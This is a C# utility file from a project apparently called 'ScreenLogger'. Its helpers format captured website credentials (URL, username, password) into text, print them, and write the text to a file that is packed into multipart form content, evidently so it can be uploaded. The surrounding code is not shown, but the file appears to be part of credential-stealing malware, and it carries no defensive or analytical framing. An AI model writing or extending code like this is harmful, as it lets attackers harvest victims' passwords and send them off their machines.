using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ScreenLogger
{
    internal class Utils
    {
        public static void PrintCredentials(IEnumerable<Credential> data)
        {
            foreach (var d in data)
                Console.WriteLine($"{d.Url}\r\n\tU: {d.Username}\r\n\tP: {d.Password}\r\n");
        }
        public static string GetCredentialString(IEnumerable<Credential> data)
        {
            string output = string.Empty;
            foreach (var d in data)
                if (d.Password.Length > 0)
                {
                    if (Program.privateMode)
                    {
                        return "Privacy Mode Enabled.";
                    }
                    output += ($"Site: {d.Url} || Login: {d.Username} || Password: {d.Password}\n");
                }
            if (Program.privateMode)
            {
                output = "Privacy Mode Enabled";
            }
            return output;
        }
        public static string GetCredentialString(IEnumerable<Credential> data, bool includeName)
        {
            string output = string.Empty;
            foreach (var d in data)
                if (d.Password.Length > 0)
                {
                    if (Program.privateMode)
                    {
                        return "Privacy Mode Enabled.";
                    }
                    output += ($"Site: {d.Url} || Login: {d.Username} || Password: {d.Password}\n");
                }
            if (Program.privateMode)
            {
                output = "Privacy Mode Enabled";
            }
            return output;
        }
        public static void AddTextFile(MultipartFormDataContent content, string text,string fileName)
        {
            //add text file to user profile directory with name (filename).txt
            string path = Path.Combine("C:\\",fileName);
            File.WriteAllText(path,text);
            StreamContent stream = new StreamContent(File.OpenRead(path));
            content.Add(stream,fileName,fileName);
        }
    }
}
